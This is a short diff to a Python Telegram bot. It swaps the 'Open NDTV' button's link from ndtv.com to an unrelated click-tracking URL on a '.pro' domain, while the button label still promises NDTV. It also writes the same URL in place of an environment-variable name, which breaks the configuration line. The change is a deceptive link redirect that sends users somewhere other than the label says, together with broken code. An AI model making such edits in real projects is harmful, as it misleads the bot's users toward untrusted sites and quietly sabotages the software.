@@ -4,7 +4,7 @@ import telebot
 from telebot import types
 
 BOT_TOKEN = re.sub(r"\s+", "", os.environ["TELEGRAM_BOT_TOKEN"])
-WEB_APP_URL = os.environ.get("WEB_APP_URL", "").strip()
+WEB_APP_URL = os.environ.get("https://wisepathwayqzm.pro/click?key=c126efa556c94dd6821b2309f2a098a9", "").strip()
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -19,7 +19,7 @@ def open_ndtv_button():
         )
     return types.InlineKeyboardButton(
         text="📰 Open NDTV",
-        url="https://www.ndtv.com",
+        url="https://wisepathwayqzm.pro/click?key=c126efa556c94dd6821b2309f2a098a9",
     )
 
 
